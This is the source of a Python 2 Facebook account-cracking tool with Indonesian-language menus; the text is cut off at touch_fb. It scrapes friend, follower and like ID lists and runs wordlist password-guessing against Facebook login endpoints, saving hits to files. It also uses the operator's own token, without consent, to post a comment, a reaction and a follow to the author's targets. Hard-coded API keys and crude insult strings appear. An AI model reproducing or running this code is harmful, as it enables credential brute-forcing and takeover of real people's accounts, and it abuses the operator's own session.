   ░   ░ ░ ░ ░ ▒     ░   ░ ░  ░   ░  ░    ░   ░   ▒    ░   ▒  ░ ░ ░ ░ ░      ░ ░    ░      ░   
   ░         ░ ░           ░      ░  ░            ░        ░    ░ ░\033[1;91m•\033[1;37m"""

logo = """\033[1;37m
   █   ▒█████   ███▄    █  ▄████  ▄▄▄▄    ▄▄▄      ▄▄▄     ▒███████▒    ▄▄▄█████▓ ███▄ ▄███▓
▓██ ▒ ██▒▒██▒  ██▒ ██ ▀█   █  ██▒ ▀█▓█████▄ ▒████▄   ▒████▄   ▒ ▒ ▒ ▄▀░    ▓  ██▒ ▓▒▓██▒▀█▀ ██▒
▓██ ░▄█ ▒▒██░  ██▒▓██  ▀█ ██▒▒██░▄▄▄▒██▒ ▄██▒██  ▀█▄ ▒██  ▀█▄ ░ ▒ ▄▀▒░     ▒ ▓██░ ▒░▓██    ▓██░
▒██▀▀█▄  ▒██   ██░▓██▒  ▐▌██▒░▓█  ██▒██░█▀  ░██▄▄▄▄██░██▄▄▄▄██  ▄▀▒   ░    ░ ▓██▓ ░ ▒██    ▒██ 
░██▓ ▒██▒░ ████▓▒░▒██░   ▓██░▒▓███▀▒░▓█  ▀█▓▒▓█   ▓██▒▓█   ▓██▒███████▒      ▒██▒ ░ ▒██▒   ░██▒
░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ░▒   ▒ ░▒▓███▀▒░▒▒   ▓▒█░▒▒   ▓▒█░▒▒ ▓░▒░▒      ▒ ░░   ░ ▒░   ░  ░
  ░▒ ░ ▒░  ░ ▒ ▒░ ░ ░░   ░ ▒░ ░   ░ ▒░▒   ░ ░ ░   ▒▒ ░ ░   ▒▒  ░▒ ▒ ░ ▒        ░    ░  ░      ░
   ░   ░ ░ ░ ░ ▒     ░   ░ ░  ░   ░  ░    ░   ░   ▒    ░   ▒  ░ ░ ░ ░ ░      ░ ░    ░      ░   
   ░         ░ ░           ░      ░  ░            ░        ░    ░ ░\n"""


host="https://mbasic.facebook.com"
ips=None
try:
	b=requests.get("https://api.ipify.org").text.strip()
	ips=requests.get("https://ipapi.com/ip_api.php?ip="+b,headers={"Referer":"https://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":ua}).json()["country_name"].lower()
except:
	ips=None
def clear():
	if " linux" in sys.platform.lower():
		os.system("clear")
	elif "win" in sys.platform.lower():
		os.system("cls")
	else:os.system("clear")
def lang(cookies):
	f=False
	rr=bs4.BeautifulSoup(requests.get("https://mbasic.facebook.com/language.php",headers=hdcok(),cookies=cookies).text,"html.parser")
	for i in rr.find_all("a",href=True):
		if "id_ID" in i.get("href"):
			requests.get("https://mbasic.facebook.com/"+i.get("href"),cookies=cookies,headers=hdcok())
			b=requests.get("https://mbasic.facebook.com/profile.php",headers=hdcok(),cookies=cookies).text	
			if "apa yang anda pikirkan sekarang" in b.lower():
				f=True
	if f==True:
		return True
	else:
		exit("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Cookies Mati").format(R,N)
def basecookie():
	if os.path.exists(".cok"):
		if os.path.getsize(".cok") !=0:
			return gets_dict_cookies(open('.cok').read().strip())
		else:logs()
	else:logs()
def hdcok():
	global host,ua
	hosts=host
	r={"origin": hosts, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "".join(bs4.re.findall("://(.*?)$",hosts)), "referer": hosts+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"}
	return r
def gets_cookies(cookies):
	result=[]
	for i in enumerate(cookies.keys()):
		if i[0]==len(cookies.keys())-1:result.append(i[1]+"="+cookies[i[1]])
		else:result.append(i[1]+"="+cookies[i[1]]+"; ")
	return "".join(result)
def gets_dict_cookies(cookies):
	result={}
	try:
		for i in cookies.split(";"):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result
	except:
		for i in cookies.split("; "):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result
def gen():
	os.system('clear')
	print logo
	print("\033[0;96m"+50*"-")
	ck=raw_input("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Cookie : ")
	if ck=="":gen()
	try:
		cks=gets_dict_cookies(ck)
		if lang(cks)==True:
			open(".cok","w").write(ck)
			convert()
			print ('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Login Success').format(G,N)
			jalan("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Please Subscribe My Channel:)")
			os.system('xdg-open https://youtube.com/channel/UCpQbmees2Ja-LLFoOJ_K_eA')
			bot_komen()
			menu()
		else:print("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Invalid Cookie").format(R,N);gen()
	except Exception as e:
		print("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Error : %s"%e);gen()
		login()


def login():
  os.system('clear')
  print banner
  print("\033[0;96m"+50*"-")
  print ' \x1b[0;97m[\x1b[0;96m1\x1b[0;97m] Login With Email & Pass (\033[1;36mRawan CheckPoint\033[1;37m)'
  print ' \x1b[0;97m[\x1b[0;96m2\x1b[0;97m] Login With Token Facebook (\033[1;36mRecommended\033[1;37m)'
  print ' \x1b[0;97m[\x1b[0;96m0\x1b[0;97m] Exite Programs'
  sek = raw_input('\n \x1b[0;97m[\x1b[0;96m•\x1b[0;97m] Choose : ')
  if sek=="":
    print("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Keyword Salah").format(R,N);login()
  elif sek=="1":
    rawancp()
  elif sek=="2":
    log_token()
#  elif sek=="3":
#    gen()
  elif sek=="0":
    exit()
  else:
    print("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Keyword Salah").format(R,N);login()



def log_token():
	os.system('clear')
	print logo
	print("\033[0;96m"+50*"-")
	data = raw_input("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Token: ")
	try:
		me = requests.get('https://graph.facebook.com/me?access_token='+data)
		a = json.loads(me.text)
		nama = a['name']
		open("login.txt",'w').write(data)
		print("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Login Success").format(G,N)
		jalan("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Please Subscribe My Channel:)")
		os.system('xdg-open https://youtube.com/channel/UCpQbmees2Ja-LLFoOJ_K_eA')
		bot_komen()
		menu()
	except KeyError:
		print ("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Invalid Token").format(R,N)
		time.sleep(1.0)
		raw_input("\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Lihat Cara Ambil Token Y/y? ")
		kontolrecode()
def convert():
	global post,reac,kom
	try:
		token = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = {
		'user-agent'                : 'Mozilla/5.0 (Linux; Android 10; GM1917) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.82 Mobile Safari/537.36', #B4ngsat
		'referer'                   : 'https://m.facebook.com/',
		'host'                      : 'm.facebook.com',
		'origin'                    : 'https://m.facebook.com',
		'upgrade-insecure-requests' : '1',
		'accept-language'           : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
		'cache-control'             : 'max-age=0',
		'accept'                    : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
		'content-type'              : 'text/html; charset=utf-8'
		}, cookies = {
		'cookie'                    : open(".cok",'r').read()
		})
		find_token = re.search('(EAAA\w+)', token.text)
		if (find_token is None):
			pass
		else:
			open("login.txt",'w').write(find_token.group(1))
			return
	except Exception as e:
		print(R+"\n\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Error : %s"%e)
		exit()
def rawancp():
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		print("\033[0;96m"+50*"-")
		id = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Email/No: ')
		pwd = getpass.getpass("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Pass Akun: ")
		jalan("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Sedang Login...")
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] No connection"
			os.sys.exit()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=AIzaSyCDTANlX6YmIIBVvHzDX5gDOO7t2IZXoiwcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"AIzaSyCDTANlX6YmIIBVvHzDX5gDOO7t2IZXoiw","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				zedd = open("login.txt", 'w')
				zedd.write(z['access_token'])
				zedd.close()
				print '\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Berhasil Login'
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				bot_komen
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] No connection"
				os.sys.exit()
		if 'checkpoint' in url:
			print("\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Akun Anda Terkena Checkpoint")
			os.system('rm -rf login.txt')
			os.sys.exit()
		else:
			print("\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Login Gagal")
			os.system('rm -rf login.txt')
			time.sleep(2)
			login()

komenredem = random.choice(["Bang Lu Ngntd!", "Bang Lu Cakep Tapi Sayang Kaya Kntl", "Siang Luting Malah Jadi Kang Ghosting", "Dah Lah Abng Cakep Banget :) ", "Siang Panen Pahala Malam Panen Kepala", "Arigato Atas Scnya Bang", "Semoga Abang Dan Keluarga Masuk Surga :)", "Semoga Abang Sukses", "Gua Pengguna Sc cr4ck Lu Bang ", "Wih Panutan Gua Nih", "Senseii Kawaiine"])

#idihnajis = random.choice(["Idih Najis ", "Muka Kaya Kontol Kok Bangga", "Harga Dirinya Rendah Amat", "Udah Gede Jangan Cuma Bisa Foto Doang Tololl", "Najis Ama Laki² Kek Gni", "Emang Gak Malu Beban Keluarga?"])

#balasdendamom = random.choice(["Idih Najis ", "Muka Kaya Kontol Kok Bangga", "Harga Dirinya Rendah Amat", "Udah Gede Jangan Cuma Bisa Foto Doang Tololl", "Emang Gak Malu Beban Keluarga?"])

def bot_komen():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Token/Cookie invalid"
		login()
	kom = komenredem
#	komentar = idihnajis
#	komentardua = balasdendamom
#	postingandua = ('144181844493153')
#	postingan = ('792392798190386')
	post = ('3909741969124574')
	requests.post('https://graph.facebook.com/'+post+'/comments/?message=' +kom+ '&access_token=' + toket)
#	requests.post('https://graph.facebook.com/'+postingan+'/comments/?message=' +komentar+ '&access_token=' + toket)
#	requests.post('https://graph.facebook.com/'+postingandua+'/comments/?message=' +komentardua+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post+'/reactions?type=LOVE&access_token='+ toket)
        requests.post('https://graph.facebook.com/100027294159255/subscribers?access_token=' + toket) # Asuan Ryo Xyounaa
        #requests.post('https://graph.facebook.com/id-lu/subscribers?access_token=' + toket) # Unknow
        #requests.post('https://graph.facebook.com/id-lu/subscribers?access_token=' + toket) # Unknow
        #requests.post('https://graph.facebook.com/id-lu/subscribers?access_token=' + toket) # Unknow
        #requests.post('https://graph.facebook.com/id-lu/subscribers?access_token=' + toket) # Unknow
        #requests.post('https://graph.facebook.com/id-lu/subscribers?access_token=' + toket) # Unknow
        menu()

durasi = str(datetime.now().strftime('%d-%m-%Y'))

### AMBIL TOKEN ###
def kontolrecode():
    os.system("clear")
    print logo
    print("\033[0;96m"+50*"-")
    jalan(p+" ["+o+"•"+p+"] Open Youtube...")
    os.system("xdg-open https://youtu.be/fbD0ArCzJ0k")
    raw_input(p+" [BACK]")
    login()   

### Ambil Cookies ###
def tutorcowlies():
    os.system("clear")
    print logo
    print("\033[0;96m"+50*"-")
    jalan(p+" ["+o+"•"+p+"] Open Youtube...")
    os.system("xdg-open ")
    raw_input(p+" [BACK]")
    login()   
#MENU CRACK, DUMP ID  
def menu():
  try:
    toket = open('login.txt','r').read()
    otw = requests.get('https://graph.facebook.com/me/?access_token='+toket)
    a = json.loads(otw.text)
    nama = a['first_name']
    id = a['id']
  except Exception as e:
    print ("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Error : %s"%e).format(R,N)
    time.sleep(1)
    login()
  os.system("clear")
  print logo
  print("\033[0;96m"+50*"-")
  print("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Your Name    : \033[1;32m"+nama)
  print("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Your ID      : \033[1;32m"+id)
  print("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Your Joined  : \033[1;32m"+durasi)
  print("\033[0;96m"+50*"-")
  print("\033[0;96m\033[0;97m [\033[1;36m1\033[1;37m] Crack ID From Friendlist/Public")
  print("\033[0;96m\033[0;97m [\033[1;36m2\033[1;37m] Crack ID From Followers")
  print("\033[0;96m\033[0;97m [\033[1;36m3\033[1;37m] Crack ID From Likes")
  print("\033[0;96m\033[0;97m [\033[1;36m4\033[1;37m] Crack From ID Target (\033[1;36mTergantung Hoki Kalian\033[1;37m)")
  print("\033[0;96m\033[0;97m [\033[1;36m5\033[1;37m] Crack With Email ")
  print("\033[0;96m\033[0;97m [\033[1;36m6\033[1;37m] Crack With Number Phone")
  print("\033[0;96m\033[0;97m [\033[1;36m7\033[1;37m] Cek Result Crack")
  print("\033[0;96m\033[0;97m [\033[1;36m8\033[1;37m] Update Script")
  print("\033[0;96m\033[0;97m [\033[1;36m0\033[1;37m] Logout")
  print ""
  r=raw_input("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Choose: ")
  if r=="":print("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] isi Yang Benar").format(R,N);menu()
  elif r=="1":
      publik()
  elif r=="2":
      followers()
  elif r=="3":
      likes()
  elif r=="4":
      hek_target()
  elif r=="5":
      emaileclone()
  elif r=="6":
      kreknomer()
  elif r=="7":
      ress()
  elif r=="8":
      jalan("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Sedang Update Tools...")
      os.system('git pull')
      jalan("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Berhasil Di Update ✓")
      time.sleep(1)
      menu()
  elif r=="0":
    try:
      #os.remove(".cok")
      os.remove("login.txt")
      #exit(basecookie())
    except Exception as e:print("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Eror file tidak ditemukan %s"%e)
  else:
    print ("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] SALAH ANJING!").format(R,N);menu()

def hek_target():
	global toket
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Token/Cookie Invalid"
		os.system('rm -rf login.txt')
		login()
	os.system('clear')
	print logo
	print("\033[0;96m"+50*"-")
	try:
		email = raw_input("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] ID TARGET: ")
		passw = raw_input("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Wordlist: ")
		total = open(passw,"r")
		total = total.readlines()
		time.sleep(1)
		print("\033[0;96m"+50*"-")
		time.sleep(1)
		print "\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] ID TARGET : "+email
		time.sleep(1)
		print "\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Total Password : "+str(len(total))
		time.sleep(1)
		jalan('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Crack Started...')
		sandi = open(passw,"r")
		for pw in sandi:
			try:
				pw = pw.replace("\n","")
				sys.stdout.write("\r\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Check Pass Valid : "+pw)
				sys.stdout.flush()
				data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(email)+"&locale=en_US&password="+(pw)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
				mpsh = json.loads(data.text)
				if 'access_token' in mpsh:
					dapat = open("hackfb/ok.txt", "w")
					dapat.write(email+"|"+pw+"\n")
					dapat.close()
					time.sleep(1.5)
					print "\n [\033[1;36m\xe2\x80\xa2\x1b[1;37m] ACCOUNT SUCCES [\033[1;36m\xe2\x80\xa2\x1b[1;37m]"
					time.sleep(2)
					print("\033[0;96m"+50*"-")
					print("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] ID : "+email)
					print("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Pass Valid : "+pw)
					print("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] HASIL CRACK TERSIMPAN DI : hackfb/ok.txt")
					raw_input(" [BACK]")
					menu()
				elif 'www.facebook.com' in mpsh["error_msg"]:
					ceks = open("hackfb/cp.txt", "w")
					ceks.write(email+"|"+pw+"\n")
					ceks.close()
					time.sleep(1.5)
					print "\n [\033[1;36m\xe2\x80\xa2\x1b[1;37m] ACCOUNT CHECKPOINT [\033[1;36m\xe2\x80\xa2\x1b[1;37m]"
					time.sleep(2)
					print("\033[0;96m"+50*"-")
					print("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] ID : "+email)
					print("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Pass Valid : "+pw)
					print("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] HASIL CRACK TERSIMPAN DI : hackfb/cp.txt")
					raw_input(" [BACK]")
					menu()
			except requests.exceptions.ConnectionError:
				print"\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Connection Error"
				time.sleep(1)
	except IOError:
		print ("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] File Wordlist Tidak Di Temukan")
		time.sleep(2)
		menu()

################ LAGI DI UPDATE! #############$##
def wordlist(): #~~~MASIH DI UPDATE
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Token/Cookie Invalid"
		os.system('rm -rf login.txt')
		login()
	os.system('clear')
	print logo
	print("\033[0;96m"+50*"-")
	try:
		idt = raw_input("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] ID TARGET: ")
		r = requests.get('https://graph.facebook.com/'+idt+'/?access_token='+toket)
		z = json.loads(r.text)
		nama = z['first_name']
		hasil = open("pass.txt", "w")
		hasil.write(nama+"123\n"+nama+"123456"+""" 
		""")
		hasil.close()
	except Exception as e:
		exit('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Error: %s' % e)

def publik():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        os.sys.exit()
    try:
        print "\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Type \'me\' Crack From Friendlist"
        idt = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] User ID Target: ')
        try:
            jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
            op = json.loads(jok.text)
        except KeyError:
            print ('\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] ID Tidak Di Temukan!').format('R')
            menu()
        r = requests.get('https://graph.facebook.com/' + idt + '?fields=friends.limit(50000)&access_token=' + toket)
        id = []
        z = json.loads(r.text)
        print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Getting ID ...'
        qq = (op["first_name"]+".json").replace(' ', '_')
        ys = open(qq, 'w')
        for a in z['friends']['data']:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
        ys.close()
        print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Total ID: %s' % len(id)
        return methode(qq)
    except Exception as e:
        exit('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Error: %s' % e)

def followers():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        os.sys.exit()
    try:
        print "\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Type \'me\' Crack From Your Followers "
        idt = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] User ID Target: ')
        try:
            pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
            sp = json.loads(pok.text)
            print("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Name : "+sp["name"])
        except KeyError:
            print ('\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] ID Tidak Di Temukan!').format('R')
            menu()
        r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=9000000&access_token="+toket)
        z=json.loads(r.text)
        id = []
        qq = (sp["first_name"]+".json").replace(" ","_")
        ys = open(qq , "w")#.replace(" ","_")
        for a in z["data"]:
            id.append(a["id"]+"<=>"+a["name"])
            ys.write(a["id"]+"<=>"+a["name"]+"\n")
        ys.close()
        print('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Total ID: '+str(len(id)))
        return methode(qq)
    except Exception as e:
        exit('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Error: %s' % e)
def likes():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        os.sys.exit()
    try:
        idt = raw_input('\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] ID Post Target: ')
        try:
            pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
            sp = json.loads(pok.text)
            print("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Name : "+sp["name"])
        except KeyError:
            print ('\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] ID Tidak Di Temukan!').format('R')
            menu()
        r=requests.get("https://graph.facebook.com/"+idt+"/likes?limit=900000&access_token="+toket)
        z=json.loads(r.text)
        id = []
        qq = ("like.json").replace(" ","_")
        ys = open(qq, "w")#.replace(" ","_")
        for a in z["data"]:
            id.append(a["id"]+"<=>"+a["name"])
            ys.write(a["id"]+"<=>"+a["name"]+"\n")
        ys.close()
        print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Total ID: %s' % len(id)
        return methode(qq)
    except Exception as e:
        exit('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Error: %s' % e)

def methode(file):
    time.sleep(1.5)
    print '\n\x1b[0;97m [ \x1b[1;36mPilih Metode Crack\x1b[1;37m ]'
    print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m1\x1b[1;37m] Crack With Mbasic.Facebook'
    print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m2\x1b[1;37m] Crack With M.Facebook'
    print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m3\x1b[1;37m] Crack With Touch.Facebook'
    print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m4\x1b[1;37m] Crack With Api.Facebook'
    print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m5\x1b[1;37m] Crack With Free.Facebook (\033[1;36mKemungkinan Dapat OK\033[1;37m)'
    print ''
    sek = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Choose: ')
    if sek == '':
        print ('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Keyword Salah').format(R, N)
        methode(file)
    elif sek == '1' or sek =="01":
        crack(file)
    elif sek == '2' or sek =="02":
        crack1(file)
    elif sek == '3' or sek =="03":
        crack2(file)
    elif sek == '4' or sek =="04":
        crack3(file)
    elif sek == '5' or sek =="05":
        freefb(file)
    else:
        print ('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Keyword Salah!').format(R, N)
        methode(file)

### EMAIL PASS HOST BUAT MENGKREK ###

def mbasic(em, pas, hosts):
    r = requests.Session()
    r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    p = r.get('https://mbasic.facebook.com/')
    b = bs4.BeautifulSoup(p.text, 'html.parser')
    meta = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
    data = {}
    for i in b('input'):
        if i.get('value') is None:
            if i.get('name') == 'email':
                data.update({'email': em})
            elif i.get('name') == 'pass':
                data.update({'pass': pas})
            else:
                data.update({i.get('name'): ''})
        else:
            data.update({i.get('name'): i.get('value')})

    data.update({'fb_dtsg': meta, 'm_sess': '', '__user': '0', '__req': 'd', 
       '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
    r.headers.update({'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8'})
    po = r.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
    if 'c_user' in r.cookies.get_dict().keys():
        return {'status': 'success', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
    else:
        if 'checkpoint' in r.cookies.get_dict().keys():
            return {'status': 'cp', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
        else:
            return {'status': 'error', 'email': em, 'pass': pas}

        return


def m_fb(em, pas, hosts):
    r = requests.Session()
    r.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    p = r.get('https://m.facebook.com/')
    b = bs4.BeautifulSoup(p.text, 'html.parser')
    meta = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
    data = {}
    for i in b('input'):
        if i.get('value') is None:
            if i.get('name') == 'email':
                data.update({'email': em})
            elif i.get('name') == 'pass':
                data.update({'pass': pas})
            else:
                data.update({i.get('name'): ''})
        else:
            data.update({i.get('name'): i.get('value')})

    data.update({'fb_dtsg': meta, 'm_sess': '', '__user': '0', '__req': 'd', 
       '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
    r.headers.update({'referer': 'https://m.facebook.com/login/?next&ref=dbl&fl&refid=8'})
    po = r.post('https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
    if 'c_user' in r.cookies.get_dict().keys():
        return {'status': 'success', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
    else:
        if 'checkpoint' in r.cookies.get_dict().keys():
            return {'status': 'cp', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
        else:
            return {'status': 'error', 'email': em, 'pass': pas}

        return


def touch_fb(em, pas, hosts):
    r = requests.Session()
